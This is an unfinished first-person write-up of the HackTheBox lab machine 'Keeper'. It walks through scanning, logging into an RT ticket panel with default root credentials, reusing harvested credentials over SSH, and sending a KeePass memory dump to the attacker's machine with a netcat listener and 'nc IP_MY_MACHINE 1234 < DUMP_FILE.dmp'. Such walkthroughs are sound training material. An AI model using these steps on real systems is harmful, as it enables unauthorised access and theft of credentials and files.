# Machine: Keeper [Hacked]

This is the twelfth machine that I have solved from hackthebox, I also used it to test the script machines, on my Markov machine, a Linux distribution that I made for pentesting. but I will indicate the common steps to follow without the [machines](https://github.com/LuisHDeAvila/htb/blob/main/machines) script. IP_MACHINE is the IP address of the keeper machine.
```
  nmap -sC -sV -p- --min-rate 5000 IP_MACHINE -vvv
```
We discover the domain keeper.htb on port 80 and add it to /etc/hosts, then we enter that domain from the web browser and a message appears to redirect us to the tickets.keeper.htb subdomain, we add it to /etc/hosts next to the domain keeper.htb, We see a login page for the RT 4.4.4 administration panel, querying default credentials
```
 NOTE: The default credentials for RT are: User: **root** Pass: password Not changing the root password from the default is a **SECURITY** risk!
# get access to the panel
# enter path:
>>> Administrador > Usuarios > elegir
```
by obtaining the credentials of the user who is registered in that panel, we start a session through SSH
```
  ssh user@domain
  # entry password of user
  # login successful
```
There we get the user.txt flag in the user's home directory, now continue to get access as root, and we also see a compressed file, which we copy to a temporary directory
```
  cd $(mktemp -d)
  cp ~/*.zip . # I don't remember if the extension is zip or rar
  unzip *.zip
```
we obtain a keepass dump with extension .dmp and a password database file with extension kdbx. So we will need a master key to be able to read the database, we can obtain it using a password-dumper for keepass, in this case use one made with dotnet v6 [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper), but first we need to get those files locally
```
  # local machine
  nc -nlvp 1234 > KeePassDump.dmp
```
IP_MY_MACHINE is the ip of interface tun0 of local machine, and DUMP_FILE.dmp is the file that we will extract from the keeper machine
```
  # ssh session on keeper machine
  nc IP_MY_MACHINE 1234 < DUMP_FILE.dmp
```

## to be continued... 
